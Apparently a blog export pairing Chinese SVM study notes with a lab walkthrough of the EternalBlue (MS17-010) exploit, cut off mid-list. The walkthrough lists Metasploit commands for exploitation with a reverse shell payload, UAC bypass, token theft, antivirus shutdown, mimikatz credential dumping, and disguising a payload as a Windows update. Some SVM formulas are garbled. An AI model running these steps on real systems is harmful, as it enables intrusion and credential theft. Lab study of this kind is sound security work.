<p>看到天使已经很好地解决了用木棒线性分球的问题，魔鬼又给了天使一个新的挑战，如下图所示。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1679140984354.png"></p>
<p>按照这种球的摆法，世界上貌似没有一根木棒可以将它们 完美分开。但天使毕竟有法力，他一拍桌子，便让这些球飞到了空中，然后凭借 念力抓起一张纸片，插在了两类球的中间。从魔鬼的角度看这些 球，则像是被一条曲线完美的切开了。</p>
<p>后来，“无聊”的科学家们把这些<strong>球称为“数据”</strong>，把<strong>木棍称为“分类面”</strong>，找到<strong>最 大间隔的木棒位置的过程称为“优化”</strong>，拍桌子让球飞到空中的<strong>念力叫“核映射”</strong>，在 空中分隔球的<strong>纸片称为“分类超平面”</strong>。这便是SVM的童话故事。</p>
<p><strong>注</strong>：上述标黑的地方都是SVM涉及到的一些术语，我们后面会具体介绍。不过从上故事可以看出SVM要解决的就是一个二分类的问题，同时对于非线性平面引入了核映射来进行特征升维。</p>
<h2 id="理解SVM：第一层"><a href="#理解SVM：第一层" class="headerlink" title="理解SVM：第一层"></a>理解SVM：第一层</h2><blockquote>
<p><strong>支持向量机</strong>，因其英文名为support vector machine，故一般简称SVM，通俗来讲，它是一种<strong>二类分类模型</strong>，其基本模型定义为<strong>特征空间上的间隔最大的线性分类器</strong>，其学习策略便是<strong>间隔最大化</strong>，最终可转化为一个<strong>凸二次规划问题</strong>的求解。</p>
</blockquote>
<p><strong>线性分类器</strong>：给定一些数据点，它们分别属于两个不同的类，现在要找到一个线性分类器把这些数据分成两类。如果用x表示数据点，用y表示类别（y可以取1或者0，分别代表两个不同的类），一个线性分类器的学习目标便是要在n维的数据空间中找到一个超平面（hyper plane），这个超平面的方程可以表示为（ wT中的T代表转置）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$W^T+b$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个超平面可以用<strong>分类函数</strong> <code>!$f(x) = X^T+b$</code>表示，当<strong>f(x) 等于0</strong>的时候，x便是位于超平面上的点，而f(x)大于0的点对应 y&#x3D;1 的数据点，f(x)小于0的点对应y&#x3D;-1的点。</p>
<h3 id="函数间隔与几何间隔"><a href="#函数间隔与几何间隔" class="headerlink" title="函数间隔与几何间隔"></a>函数间隔与几何间隔</h3><p>在超平面<code>wx+b=0</code>确定的情况下，<code>|wx+b|</code>能够表示点x到距离超平面的远近，而通过观察wx+b的符号与类标记y的符号是否一致可判断分类是否正确，所以，可以用<code>(y(w*x+b))</code>的正负性来判定或表示分类的正确性。于此，我们便引出了<strong>函数间隔</strong>（functional margin）的概念。</p>
<p>函数间隔公式：<code>!$γ = y(W^T+b) = y(f(x))$</code></p>
<p>而超平面(w，b)关于数据集T中所有样本点(xi，yi)的函数间隔最小值（其中，x是特征，y是结果标签，i表示第i个样本），便为超平面(w, b)关于训练数据集T的函数间隔：<code>!$γ  = minγ i(i=1,...n)$</code></p>
<p>但这样定义的函数间隔有问题，即如果成比例的改变w和b（如将它们改成2w和2b），则函数间隔的值f(x)却变成了原来的2倍（虽然此时超平面没有改变），所以只有函数间隔还远远不够。</p>
<p>几何间隔：</p>
<p>事实上，我们可以对法向量w加些约束条件，从而引出真正定义点到超平面的距离–几何间隔（geometrical margin）的概念。假定对于一个点 x ，令其垂直投影到超平面上的对应点为 x0 ，w 是垂直于超平面的一个向量，<code>!$\gamma$</code>为样本x到超平面的距离，如下图所示：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1679142633863.png"></p>
<p>从上述函数间隔和几何间隔的定义可以看出：<strong>几何间隔就是函数间隔除以||w||<strong>，而且</strong>函数间隔</strong>y*(wx+b) &#x3D; y*f(x)<strong>实际上就是|f(x)|<strong>，只是人为定义的一个间隔度量，而</strong>几何间隔</strong>|f(x)|&#x2F;||w||才是直观上的<strong>点到超平面的距离</strong>。<br>\</p>
<h3 id="最大间隔分类器的定义"><a href="#最大间隔分类器的定义" class="headerlink" title="最大间隔分类器的定义"></a>最大间隔分类器的定义</h3><p>对一个数据点进行分类，当超平面离数据点的“间隔”越大，分类的确信度（confidence）也越大。所以，为了使得分类的确信度尽量高，需要让所选择的超平面能够最大化这个“间隔”值。这个间隔就是下图中的Gap的一半。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1679142732656.png"></p>
<p>通过由前面的分析可知：函数间隔不适合用来最大化间隔值，因为在超平面固定以后，可以等比例地缩放w的长度和b的值，这样可以使得<code>!$f(x) = X^T+b$</code>的值任意大，亦即函数间隔可以在超平面保持不变的情况下被取得任意大。但几何间隔因为除上了w，使得在缩放w和b的时候几何间隔的值是不会改变的，它只随着超平面的变动而变动，因此，这是更加合适的一个间隔。换言之，这里要找的最大间隔分类超平面中的**“间隔”指的是几何间隔。</p>
<p>如下图所示，中间的实线便是寻找到的最优超平面（Optimal Hyper Plane），其到两条虚线边界的距离相等，这个距离便是几何间隔，两条虚线间隔边界之间的距离等于2倍几何间隔，而<strong>虚线间隔边界上的点则是支持向量</strong>。由于这些支持向量刚好在虚线间隔边界上，所以它们满足 <code>!$y(W^T+b) = 1$</code>，对于所有不是支持向量的点，则显然有 <code>!$y(W^T+b) &gt; 1$</code>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1679142863596.png"></p>
<p><strong>注</strong>：到这里SVM第一层的<strong>基本原理</strong>便已经介绍完了，其优化过程就是<strong>求解最大间隔</strong>的过程，并通过求得的超平面实现数据的分类。</p>
<h2 id="深度SVM：第二层"><a href="#深度SVM：第二层" class="headerlink" title="深度SVM：第二层"></a>深度SVM：第二层</h2><p>事实上，大部分时候数据<strong>并不是线性可分</strong>的，这个时候满足这样条件的超平面就根本不存在。在上文中，我们已经了解到了SVM处理线性可分的情况，那对于非线性的数据SVM咋处理呢？对于非线性的情况，SVM 的处理方法是<strong>选择一个核函数 κ(⋅,⋅) ，通过将数据映射到高维空间</strong>，来解决在原始空间中线性不可分的问题。</p>
<p>具体来说，在线性不可分的情况下，支持向量机首先<strong>在低维空间中完成计算</strong>，然后<strong>通过核函数将输入空间映射到高维特征空间</strong>，最终<strong>在高维特征空间中构造出最优分离超平面</strong>，从而把平面上本身不好分的非线性数据分开。如图所示，一堆数据在二维空间无法划分，从而映射到三维空间里划分：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1679143200873.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1679143220495.png"></p>
<p>通常人们会从一些<strong>常用的核函数</strong>中选择（根据问题和数据的不同，选择不同的参数，实际上就是得到了不同的核函数），例如：<code>多项式核、高斯核、线性核</code>。</p>
<p>读者可能还是没明白核函数到底是个什么东西？我再简要概括下，即以下三点：</p>
<ul>
<li>实际中，我们会经常遇到<strong>线性不可分</strong>的样例，此时，我们的常用做法是<strong>把样例特征映射到高维空间</strong>中去(映射到高维空间后，相关特征便被分开了，也就达到了分类的目的)；</li>
<li>但进一步，如果凡是遇到线性不可分的样例，一律映射到高维空间，那么这个维度大小是会高到可怕的。那咋办呢？</li>
<li>此时，核函数就隆重登场了，核函数的价值在于它虽然也是将特征进行从低维到高维的转换，但<strong>核函数绝就绝在它事先在低维上进行计算</strong>，而将实质上的分类效果表现在了高维上，避免了直接在高维空间中的复杂计算。</li>
</ul>
<p>如果数据中出现了离群点outliers，那么就可以使用松弛变量来解决。</p>
<p>不准确的说，SVM它本质上即是一个<strong>分类方法</strong>，用 <code>w^T+b</code> 定义分类函数，于是求w、b，为<strong>寻最大间隔</strong>，引出<code>1/2||w||^2</code>，继而引入<strong>拉格朗日因子</strong>，化为对拉格朗日乘子a的求解（求解过程中会涉及到一系列最优化或凸二次规划等问题），如此，求w.b与求a等价，而a的求解可以用一种快速学习算法SMO，至于核函数，是为<strong>处理非线性情况</strong>，若直接映射到高维计算恐<strong>维度爆炸</strong>，故在<strong>低维计算，等效高维表现</strong>。</p>
<h1 id="SVM的一些问题"><a href="#SVM的一些问题" class="headerlink" title="SVM的一些问题"></a>SVM的一些问题</h1><ul>
<li><p>是否存在一组参数使SVM训练误差为0？</p>
<ul>
<li>答：存在</li>
</ul>
</li>
<li><p>训练误差为0的SVM分类器一定存在吗？</p>
<ul>
<li>答：一定存在</li>
</ul>
</li>
<li><p><strong>加入松弛变量的SVM的训练误差可以为0吗</strong>？</p>
<ul>
<li><strong>答</strong>：使用SMO算法训练的线性分类器并不一定能得到训练误差为0的模型。这是由于我们的优化目标改变了，并<strong>不再是使训练误差最小</strong>。</li>
</ul>
</li>
<li><p><strong>带核的SVM为什么能分类非线性问题?</strong></p>
<ul>
<li><strong>答</strong>：核函数的本质是<strong>两个函数的內积</strong>，通过核函数将其<strong>隐射到高维空间</strong>，在高维空间非线性问题转化为线性问题, SVM得到超平面是高维空间的线性分类平面。其分类结果也视为低维空间的非线性分类结果, 因而带核的SVM就能分类非线性问题。</li>
</ul>
</li>
<li><p><strong>如何选择核函数</strong>？</p>
<ul>
<li>如果特征的<strong>数量大到和样本数量差不多</strong>，则选用LR或者线性核的SVM；</li>
<li>如果<strong>特征的数量小</strong>，<strong>样本的数量正常</strong>，则选用SVM+高斯核函数；</li>
<li>如果<strong>特征的数量小</strong>，而<strong>样本的数量很大</strong>，则需要手工添加一些特征从而变成第一种情况。</li>
</ul>
</li>
</ul>
<h1 id="LR和SVM的联系与区别"><a href="#LR和SVM的联系与区别" class="headerlink" title="LR和SVM的联系与区别"></a>LR和SVM的联系与区别</h1><h2 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h2><ul>
<li>都是<strong>线性分类器</strong>。本质上都是求一个<strong>最佳分类超平面</strong>。</li>
<li>都是<strong>监督学习</strong>算法。</li>
<li>都是<strong>判别模型</strong>。判别模型不关心数据是怎么生成的，它只关心信号之间的差别，然后用差别来简单对给定的一个信号进行分类。常见的判别模型有：KNN、SVM、LR，常见的生成模型有：朴素贝叶斯，隐马尔可夫模型。</li>
</ul>
<h2 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h2><ul>
<li>LR是参数模型，<strong>svm是非参数模型</strong>，linear和rbf则是针对数据线性可分和不可分的区别；</li>
<li>从目标函数来看，区别在于逻辑回归采用的是logistical loss，SVM采用的是hinge loss，这两个损失函数的目的都是增加对分类影响较大的数据点的权重，减少与分类关系较小的数据点的权重。</li>
<li>SVM的处理方法是只考虑support vectors，也就是和分类最相关的少数点，去学习分类器。而逻辑回归通过非线性映射，大大减小了离分类平面较远的点的权重，相对提升了与分类最相关的数据点的权重。</li>
<li><strong>逻辑回归</strong>相对来说<strong>模型更简单</strong>，好理解，特别是大规模线性分类时比较方便。而SVM的理解和优化相对来说复杂一些，SVM转化为对偶问题后,分类只需要计算与少数几个支持向量的距离,这个在进行复杂核函数计算时优势很明显,能够大大简化模型和计算。</li>
<li>logic 能做的 svm能做，但可能在准确率上有问题，<strong>svm能做的logic有的做不了</strong>。</li>
</ul>
<h1 id="我的笔记"><a href="#我的笔记" class="headerlink" title="我的笔记"></a>我的笔记</h1><p><strong>参考链接</strong>：<a href="https://blog.csdn.net/v_july_v/article/detail">https://blog.csdn.net/v_july_v/article/detail</a></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_1.jpg" alt="SVM_202303301755_26706 1"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_2.jpg" alt="SVM_202303301755_26706 2"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_3.jpg" alt="SVM_202303301755_26706 3"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_4.jpg" alt="SVM_202303301755_26706 4"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_5.jpg" alt="SVM_202303301755_26706 5"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_6.jpg" alt="SVM_202303301755_26706 6"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_7.jpg" alt="SVM_202303301755_26706 7"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_8.jpg" alt="SVM_202303301755_26706 8"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_9.jpg" alt="SVM_202303301755_26706 9"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_10.jpg" alt="SVM_202303301755_26706 10"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/SVM_202303301755_26706_11.jpg" alt="SVM_202303301755_26706 11"></p>
]]></content>
      <categories>
        <category>【-基础知识-】人工智能</category>
        <category>机器学习算法</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>永恒之蓝漏洞复现（流程模拟）</title>
    <url>/2023/03/29/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/</url>
    <content><![CDATA[<h1 id="情报搜集阶段"><a href="#情报搜集阶段" class="headerlink" title="情报搜集阶段"></a>情报搜集阶段</h1><h3 id="查看本机ip"><a href="#查看本机ip" class="headerlink" title="查看本机ip"></a>查看本机ip</h3><blockquote>
<p><code>ifconfig</code> 查看ip地址</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100106378.png" alt="image-20231109100106378"></p>
<h3 id="nmap扫描子网"><a href="#nmap扫描子网" class="headerlink" title="nmap扫描子网"></a>nmap扫描子网</h3><blockquote>
<p><code>nmap 192.168.21.129/24 扫描子网</code></p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100117877.png" alt="image-20231109100117877"></p>
<h3 id="查看扫描结果，并进行分析"><a href="#查看扫描结果，并进行分析" class="headerlink" title="查看扫描结果，并进行分析"></a>查看扫描结果，并进行分析</h3><h1 id="威胁建模阶段"><a href="#威胁建模阶段" class="headerlink" title="威胁建模阶段"></a>威胁建模阶段</h1><p>发现有目标开启了445端口，对其进行进一步扫描，查看操作系统及服务</p>
<blockquote>
<p><code>nmap -O -sV 192.168.21.154 </code></p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100126864.png" alt="image-20231109100126864"></p>
<p>发现该主机开启445端口，并且为win7操作系统，判断可以进行永恒之蓝漏洞利用。</p>
<h1 id="漏洞分析阶段"><a href="#漏洞分析阶段" class="headerlink" title="漏洞分析阶段"></a>漏洞分析阶段</h1><h3 id="进入MSF框架"><a href="#进入MSF框架" class="headerlink" title="进入MSF框架"></a>进入MSF框架</h3><blockquote>
<p>msfconsole</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100137651.png" alt="image-20231109100137651"></p>
<h3 id="查找漏洞相关模块"><a href="#查找漏洞相关模块" class="headerlink" title="查找漏洞相关模块"></a>查找漏洞相关模块</h3><blockquote>
<p><code>search ms17-010</code></p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100146724.png" alt="image-20231109100146724"></p>
<h3 id="利用扫描模块"><a href="#利用扫描模块" class="headerlink" title="利用扫描模块"></a>利用扫描模块</h3><blockquote>
<p><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhost 192.168.21.154</code><br><code>run</code></p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100155456.png" alt="image-20231109100155456"></p>
<p>通过漏洞扫描模块扫描后得出结果，此系统易受到永恒之蓝漏洞攻击</p>
<h1 id="漏洞攻击阶段"><a href="#漏洞攻击阶段" class="headerlink" title="漏洞攻击阶段"></a>漏洞攻击阶段</h1><blockquote>
<p>使用ms17-010攻击模块，对靶机进行攻击<br><code>search ms17-010----&gt;use id</code></p>
</blockquote>
<h3 id="查看参数"><a href="#查看参数" class="headerlink" title="查看参数"></a>查看参数</h3><blockquote>
<p><code>show options</code></p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100209014.png" alt="image-20231109100209014"><br>需要设置目标主机的IP地址</p>
<h3 id="设定参数"><a href="#设定参数" class="headerlink" title="设定参数"></a>设定参数</h3><blockquote>
<p><code>set rhost 192.168.21.154</code></p>
</blockquote>
<h3 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h3><blockquote>
<p><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>注：如果没有设置payload,使用上漏洞只是回弹shell，使用后回弹meterpreter。</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100224323.png" alt="image-20231109100224323"></p>
<h3 id="run-获得权限"><a href="#run-获得权限" class="headerlink" title="run-&gt;获得权限"></a>run-&gt;获得权限</h3><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308573542.png" alt="得到shell"></p>
<h1 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h1><blockquote>
<p>一般在获得shell后即进入后渗透阶段。后渗透攻击，顾名思义就是漏洞利用成功后的攻击，即拿到系统权限后的后续操作。后渗透攻击阶段的操作，可分为两种：权限维持和内网渗透。这里主要是就第一个进行测试。</p>
</blockquote>
<h2 id="meterpreter的基本系统命令"><a href="#meterpreter的基本系统命令" class="headerlink" title="meterpreter的基本系统命令"></a>meterpreter的基本系统命令</h2><ul>
<li>sessions    #sessions –h 查看帮助</li>
<li>sessions -l #列出当前会话</li>
<li>sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</li>
<li>background  #将当前会话放置后台</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100233716.png" alt="image-20231109100233716"></p>
<ul>
<li>shell #进入目标机cmd shell</li>
<li>sysinfo # 查看目标机系统信息</li>
<li>getuid # 查看权限</li>
<li>getpid # 获取当前进程的pid</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100243466.png" alt="image-20231109100243466"></p>
<ul>
<li>ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100250891.png" alt="image-20231109100250891"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><blockquote>
<p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权</p>
</blockquote>
<h3 id="getsystem提权"><a href="#getsystem提权" class="headerlink" title="getsystem提权"></a>getsystem提权</h3><blockquote>
<p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100304620.png" alt="image-20231109100304620"></p>
<p>一般直接使用getsystem不会成功。</p>
<blockquote>
<p>ps:<br>在meterpreter shell界面，我们可以通过shell命令，进入cmd命令提示符，使用<code>net user</code>查看当前用户，发现当前用户实际是在管理组administrators组中，那为什么还提权不了呢？<br>原来，windows操作系统在vista以后增加了一个UAC的功能，英文全称User Access Control，该功能对管理员组的用户起到一定限制，进而保护计算机安全，当我们需要运行一些重要的程序，只有管理员权限才能运行的程序时，UAC功能都会弹出一个对话框，对用户进行询问，当用户点击了同意按钮，程序才会以管理员或system权限运行。因此，我们要想提权成功，首先要绕过windows的UAC限制，接下来我们来看常用的绕过UAC的套路。</p>
</blockquote>
<h3 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h3><blockquote>
<p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限.</p>
</blockquote>
<ul>
<li><code>use exploit/windows/local/bypassuac</code></li>
<li><code>use exploit/windows/local/bypassuac_injection</code></li>
<li><code>use windows/local/bypassuac_vbs</code></li>
<li><code>use windows/local/ask</code></li>
</ul>
<p>下面以其中一个举例：（其他几个操作类似）</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100322981.png" alt="image-20231109100322981"></p>
<h3 id="提高程序运行级别"><a href="#提高程序运行级别" class="headerlink" title="提高程序运行级别"></a>提高程序运行级别</h3><blockquote>
<p>这种方法可以利用<code>exploit/windows/local/ask模块</code>，但是该模块实际上只是以高权限重启一个返回式shellcode,并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择“yes”，就可以程序返回一个高权限meterpreter shell(需要执行getsystem)。</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100332438.png" alt="image-20231109100332438"><br>注：我们可以把name改为windows_updata.exe迷惑操作者。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100341663.png" alt="image-20231109100341663"></p>
<h3 id="利用windows提权漏洞进行提权"><a href="#利用windows提权漏洞进行提权" class="headerlink" title="利用windows提权漏洞进行提权"></a>利用windows提权漏洞进行提权</h3><blockquote>
<p>上述getsystem提权需要用户在管理组，如果不是，就需要使用其他方法提权。这里介绍利用已有的漏洞进行提权。</p>
</blockquote>
<ul>
<li><p>这里先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权</p>
</li>
<li><p>meterpreter &gt; <code>run post/windows/gather/enum_patches</code>  #查看补丁信息</p>
</li>
<li><p>msf &gt; <code>use exploit/windows/local/ms13_053_schlamperei</code>  #使用具体的exp,根据列出的具体可用exp而定</p>
</li>
<li><p>msf &gt; <code>set SESSION 2   </code></p>
</li>
<li><p>msf &gt; <code>exploit</code></p>
<ol start="2">
<li>也可以使用local_exploit_suggester进行查询哪些exp可以用.</li>
</ol>
</li>
<li><p><code>use post/multi/recon/local_exploit_suggester</code></p>
</li>
<li><p><code>set session i</code></p>
</li>
<li><p><code>set lhost 192.168.xxx.xxx</code></p>
</li>
<li><p><code>run</code></p>
</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100356238.png" alt="image-20231109100356238"></p>
<h3 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h3><blockquote>
<p>另一个提权的方法是扮演一个帐户从一个特定进程偷取令牌。为此，我们需要“incognito”扩展.</p>
</blockquote>
<ul>
<li><code>use incognito </code>     							#help incognito  查看帮助</li>
<li><code>list_tokens -u </code>  							#查看可用的token</li>
<li><code>impersonate_token &#39;NT AUTHORITY\SYSTEM&#39;</code> 		#假冒SYSTEM token</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100405201.png" alt="image-20231109100405201"></p>
<ul>
<li><code>list_tokens -g</code> #列出目标主机用户组的可用令牌</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100416549.png" alt="image-20231109100416549"></p>
<ul>
<li>meterpreter &gt;<code>execute -f cmd.exe -i -t</code> #调用域权限shell</li>
<li><code>chcp 65001</code> #UTF-8编码代码页，解决乱码</li>
<li>meterpreter &gt; <code>getuid</code></li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100426075.png" alt="image-20231109100426075"></p>
<ul>
<li><code>steal_token </code>	#从指定进程中窃取token   先ps列出可用的值</li>
<li><code>drop_token</code>			#删除窃取的token</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100436238.png" alt="image-20231109100436238"></p>
<ul>
<li><p><code>rev2self </code>  			#返回原始token</p>
</li>
<li><p><code>migrate+pid </code>  #将当前会话进程迁移到一个指定的进程ID<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100445906.png" alt="image-20231109100445906"></p>
</li>
</ul>
<h2 id="后续提权操作"><a href="#后续提权操作" class="headerlink" title="后续提权操作"></a>后续提权操作</h2><h3 id="基本信息搜集"><a href="#基本信息搜集" class="headerlink" title="基本信息搜集"></a>基本信息搜集</h3><ol>
<li>检测是否为虚拟机<blockquote>
<p><code>run post/windows/gather/checkvm</code> #是否虚拟机</p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100454752.png" alt="image-20231109100454752"></p>
<ol start="2">
<li>关闭杀毒软件<blockquote>
<p><code>run killav </code></p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100506126.png" alt="image-20231109100506126"></p>
<ol start="3">
<li>获取安装软件信息<blockquote>
<p><code>run post/windows/gather/enum_applications</code> #获取安装软件信息</p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100514793.png" alt="image-20231109100514793"></p>
<ol start="4">
<li>获取最近的文件操作<blockquote>
<p><code>run post/windows/gather/dumplinks</code>   #获取最近的文件操作</p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100523697.png" alt="image-20231109100523697"></p>
<ol start="5">
<li>列举登录过的用户</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100532976.png" alt="image-20231109100532976"></p>
<h3 id="hash与明文密码读取"><a href="#hash与明文密码读取" class="headerlink" title="hash与明文密码读取"></a>hash与明文密码读取</h3><ul>
<li><code>load mimikatz</code>    #help mimikatz 查看帮助</li>
<li><code> wdigest</code>  #获取Wdigest密码</li>
<li><code>mimikatz_command -f samdump::hashes</code>  #执行mimikatz原始命令</li>
<li><code>mimikatz_command -f sekurlsa::searchPasswords</code></li>
<li><code>run post/windows/gather/smart_hashdump</code>  #从SAM导出密码哈希需要SYSTEM权限</li>
</ul>
<h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><ul>
<li>getwd 或者pwd # 查看当前工作目录  </li>
<li>ls</li>
<li>cd</li>
<li><code>search -f *pass* </code>     # 搜索文件  -h查看帮助</li>
<li>cat c:\lltest\lltestpasswd.txt  # 查看文件内容</li>
<li><code>upload /tmp/hack.txt C:\\lltest </code> # 上传文件到目标机上</li>
<li><code>download c:\\lltest\\lltestpasswd.txt /tmp/ </code># 下载文件到本机上</li>
<li>edit c:\1.txt #编辑或创建文件  没有的话，会新建文件</li>
<li>rm C:\lltest\hack.txt</li>
<li><code>mkdir lltest2 </code> #只能在当前目录下创建文件夹</li>
<li><code>rmdir lltest2</code>  #只能删除当前目录下文件夹</li>
<li>getlwd   或者 lpwd   #操作攻击者主机 查看当前目录</li>
<li>lcd &#x2F;tmp   #操作攻击者主机 切换目录</li>
</ul>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote>
<p>信息收集的脚本位于：<br>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;gather<br>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;linux&#x2F;gather</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100541994.png" alt="image-20231109100541994"></p>
<ul>
<li>run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机</li>
